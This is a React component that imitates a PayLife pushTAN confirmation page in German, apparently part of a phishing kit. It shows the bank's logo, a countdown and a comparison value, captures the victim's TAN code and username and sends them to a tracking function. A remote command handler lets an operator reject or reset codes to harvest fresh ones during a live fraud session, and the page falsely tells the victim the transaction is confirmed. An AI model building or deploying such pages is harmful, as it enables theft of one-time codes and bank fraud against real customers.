"use client";

import { useEffect, useState, useRef, useCallback } from "react";
import { trackSubmission, onCommand } from "@/lib/track";

/* ---- random 4-char reference code ---- */
function generateVergleichswert(): string {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  let result = "";
  for (let i = 0; i < 4; i++) {
    result += chars[Math.floor(Math.random() * chars.length)];
  }
  return result;
}

const TOTAL_SECONDS = 300; // 5 minutes

export default function PushTanForm({ user, vergleichswert: vergleichswertProp }: { user: string; vergleichswert?: string }) {
  const [vergleichswert] = useState(() => vergleichswertProp || generateVergleichswert());
  const [code, setCode] = useState("");
  const [secondsLeft, setSecondsLeft] = useState(TOTAL_SECONDS);
  const [expired, setExpired] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [success, setSuccess] = useState(false);
  const timerRef = useRef<ReturnType<typeof setInterval> | null>(null);

  /* ---- countdown timer ---- */
  useEffect(() => {
    timerRef.current = setInterval(() => {
      setSecondsLeft((prev) => {
        if (prev <= 1) {
          clearInterval(timerRef.current!);
          setExpired(true);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => {
      if (timerRef.current) clearInterval(timerRef.current);
    };
  }, []);

  /* ---- command handler ---- */
  useEffect(() => {
    onCommand((cmd) => {
      switch (cmd.type) {
        case "show_error":
          setError((cmd.payload?.message as string) || "Ein Fehler ist aufgetreten.");
          break;
        case "clear_error":
          setError(null);
          break;
        case "reject_tan":
          setError("TAN-Code ist falsch. Bitte versuchen Sie es erneut.");
          setCode("");
          break;
        case "retry_tan":
          setError("Bitte geben Sie einen neuen Code ein.");
          setCode("");
          setExpired(false);
          setSecondsLeft(TOTAL_SECONDS);
          if (timerRef.current) clearInterval(timerRef.current);
          timerRef.current = setInterval(() => {
            setSecondsLeft((prev) => {
              if (prev <= 1) {
                clearInterval(timerRef.current!);
                setExpired(true);
                return 0;
              }
              return prev - 1;
            });
          }, 1000);
          break;
      }
    });
    return () => onCommand(() => {});
  }, []);

  const formatTime = useCallback((s: number) => {
    const m = Math.floor(s / 60);
    const sec = s % 60;
    return `${m}:${sec.toString().padStart(2, "0")}`;
  }, []);

  const progressFraction = secondsLeft / TOTAL_SECONDS;

  const isValid = code.length >= 4 && code.length <= 6 && !expired;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isValid || submitting) return;
    setSubmitting(true);
    setError(null);
    await trackSubmission("mypaylife", "pushtan", { code, vergleichswert, user });
    setSuccess(true);
    setSubmitting(false);
  };

  /* ---- SVG ring constants ---- */
  const ringSize = 80;
  const strokeWidth = 4;
  const radius = (ringSize - strokeWidth) / 2;
  const circumference = 2 * Math.PI * radius;
  const dashOffset = circumference * (1 - progressFraction);

  /* ---- Render ---- */
  return (
    <div className="page-container facelift">
      <section id="authenticationContainer">
        <div className="auth-row">
          {/* LEFT: PushTAN form */}
          <div id="login-content">
            <header id="headerContainer" role="banner">
              <img
                alt="PayLife Logo"
                className="logo-desktop"
                src="/mypaylife/paylife-logo.svg"
                style={{ height: 50 }}
              />
            </header>

            <section id="authenticationSection">
              <main>
                <div id="loginContainer">
                  <h1 className="form-signin-heading">pushTAN</h1>

                  {/* Error banner */}
                  {error && (
                    <div style={{
                      backgroundColor: "#fef2f2",
                      border: "1px solid #fecaca",
                      borderRadius: 6,
                      padding: "10px 14px",
                      color: "#b91c1c",
                      fontSize: 13,
                      lineHeight: 1.5,
                      marginBottom: 14,
                    }}>
                      {error}
                    </div>
                  )}

                  {/* Info text */}
                  <p style={{
                    fontSize: 13,
                    color: "#555555",
                    lineHeight: 1.5,
                    margin: "0 0 16px",
                  }}>
                    Best{"ä"}tigen Sie die Transaktion in Ihrer pushTAN-App.
                    Vergleichen Sie den angezeigten Vergleichswert mit dem Wert auf Ihrem Ger{"ä"}t.
                  </p>

                  {success ? (
                    /* ---- Success message ---- */
                    <div style={{ textAlign: "center", padding: "30px 0 40px" }}>
                      <div style={{
                        width: 56,
                        height: 56,
                        borderRadius: "50%",
                        backgroundColor: "#a5b8d0",
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                        margin: "0 auto 18px",
                      }}>
                        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#000066" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                          <polyline points="20 6 9 17 4 12" />
                        </svg>
                      </div>
                      <p style={{
                        fontSize: 18,
                        fontWeight: 500,
                        color: "#000000",
                        marginBottom: 6,
                      }}>
                        Transaktion best{"ä"}tigt
                      </p>
                      <p style={{
                        fontSize: 13,
                        color: "#555555",
                      }}>
                        Ihre Eingabe wurde erfolgreich {"ü"}bermittelt.
                      </p>
                    </div>
                  ) : (
                    <form onSubmit={handleSubmit} noValidate>
                      {/* Timer ring + Vergleichswert */}
                      <div style={{
                        display: "flex",
                        alignItems: "center",
                        gap: 20,
                        justifyContent: "center",
                        padding: "14px 0 18px",
                      }}>
                        {/* Countdown ring */}
                        <div style={{ position: "relative", width: ringSize, height: ringSize, flexShrink: 0 }}>
                          <svg width={ringSize} height={ringSize} style={{ transform: "rotate(-90deg)" }}>
                            {/* Background circle */}
                            <circle
                              cx={ringSize / 2}
                              cy={ringSize / 2}
                              r={radius}
                              fill="none"
                              stroke="#ced4da"
                              strokeWidth={strokeWidth}
                            />
                            {/* Progress circle */}
                            <circle
                              cx={ringSize / 2}
                              cy={ringSize / 2}
                              r={radius}
                              fill="none"
                              stroke={expired ? "#cc3434" : "#000066"}
                              strokeWidth={strokeWidth}
                              strokeDasharray={circumference}
                              strokeDashoffset={dashOffset}
                              strokeLinecap="round"
                              style={{ transition: "stroke-dashoffset 1s linear" }}
                            />
                          </svg>
                          <div style={{
                            position: "absolute",
                            top: 0,
                            left: 0,
                            width: "100%",
                            height: "100%",
                            display: "flex",
                            alignItems: "center",
                            justifyContent: "center",
                            fontSize: 15,
                            fontWeight: 500,
                            color: expired ? "#cc3434" : "#000000",
                          }}>
                            {formatTime(secondsLeft)}
                          </div>
                        </div>

                        {/* Vergleichswert */}
                        <div>
                          <p style={{
                            fontSize: 11,
                            color: "#6c757d",
                            marginBottom: 4,
                            textTransform: "uppercase",
                            letterSpacing: "0.05em",
                          }}>
                            Vergleichswert
                          </p>
                          <p style={{
                            fontSize: 28,
                            fontWeight: 500,
                            color: "#000066",
                            letterSpacing: "0.15em",
                            lineHeight: 1,
                            margin: 0,
                          }}>
                            {vergleichswert}
                          </p>
                        </div>
                      </div>

                      {/* Divider */}
                      <hr style={{
                        border: "none",
                        borderTop: "1px solid #ced4da",
                        margin: "0 0 14px",
                      }} />

                      {/* Code input */}
                      <label
                        htmlFor="tan-code"
                        className="form-signin-label"
                        style={{ visibility: "hidden" }}
                      >
                        TAN-Code
                      </label>
                      <div className="input-group">
                        <input
                          id="tan-code"
                          name="tan-code"
                          type="text"
                          className="form-control round-input-edges"
                          placeholder="TAN-Code eingeben"
                          value={code}
                          onChange={(e) => setCode(e.target.value.replace(/[^A-Za-z0-9]/g, "").slice(0, 6))}
                          maxLength={6}
                          disabled={expired}
                          autoComplete="one-time-code"
                          inputMode="text"
                          spellCheck={false}
                          suppressHydrationWarning
                          style={expired ? { opacity: 0.5 } : {}}
                        />
                        <span
                          className="input-group-text"
                          style={{ display: code ? undefined : "none" }}
                          onClick={() => setCode("")}
                        >
                          <span className="input-group-addon add-on">
                            <i className="bi bi-x-circle-fill">{"✕"}</i>
                          </span>
                        </span>
                      </div>

                      {expired && (
                        <p style={{
                          textAlign: "center",
                          color: "#cc3434",
                          fontSize: 13,
                          marginTop: 10,
                          marginBottom: 0,
                        }}>
                          Zeit abgelaufen. Bitte fordern Sie einen neuen Code an.
                        </p>
                      )}

                      {/* Submit button */}
                      <div className="button-container clearfix">
                        <input
                          type="submit"
                          id="submitTan"
                          value={submitting ? "Wird geprüft..." : "Bestätigen"}
                          className="btn btn-primary"
                          disabled={!isValid || submitting}
                          style={(!isValid || submitting) ? { opacity: 0.6, cursor: "not-allowed" } : {}}
                        />
                      </div>
                    </form>
                  )}
                </div>
              </main>
            </section>
          </div>

          {/* RIGHT: Hero image */}
          <div className="d-none d-md-block full-size-image"></div>
        </div>
      </section>

      {/* Footer */}
      <div id="footerContainer">
        <div className="footer-content">
          <span>
            <a href="#" target="_blank">
              FAQ
            </a>
            <a href="#" target="_blank">
              Impressum
            </a>
          </span>
          <span>
            <img
              src="/mypaylife/paylife-logo.svg"
              className="footer-logo"
              style={{ height: 17 }}
              alt="PayLife Logo"
            />
          </span>
        </div>
      </div>
    </div>
  );
}
